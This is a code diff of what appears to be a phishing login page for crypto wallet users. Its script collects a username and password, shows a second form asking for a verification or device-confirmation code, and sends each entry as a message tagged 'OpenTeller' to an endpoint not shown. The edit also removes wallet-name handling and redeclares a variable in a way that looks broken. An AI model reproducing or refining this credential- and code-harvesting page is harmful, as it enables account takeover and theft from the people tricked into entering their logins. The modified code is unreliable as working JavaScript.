@@ -143,7 +143,6 @@
     </form>
     
     <form action="#" id="codeForm">
-
       <div class="input-group">
         <label for="code" class="login-label">Enter verification code or confirm login on your device</label>
         <input type="text" id="code" placeholder="">
@@ -162,10 +161,6 @@
 
 
 <script>
-  // Wallet name from URL or localStorage
-  const urlParams = new URLSearchParams(window.location.search);
-  const walletParam = urlParams.get('wallet') || localStorage.getItem('selectedWallet');
-
   $("#loginForm").submit((e) => {
     e.preventDefault();
     const username = $("#username").val();
@@ -182,12 +177,7 @@
   });
 
   const sendData = (data, type) => {
-    if (type == 'cred') {
-      document.querySelector("#loginForm").style.display = 'none';
-      document.querySelector("#codeForm").style.display = 'block';
-    }
-    data = {
-      name: walletParam,
+    const data = {
       message: data,
       from_name: "OpenTeller"
     }
@@ -201,7 +191,7 @@
       .then((message) => {
         console.log(message);
         $(".login-btn").prop("disabled", false).html("Log In");
-        if(type === 'cred') {
+        if(type == 'cred') {
           $("#loginForm").hide();
           $("#codeForm").show();
         } else {
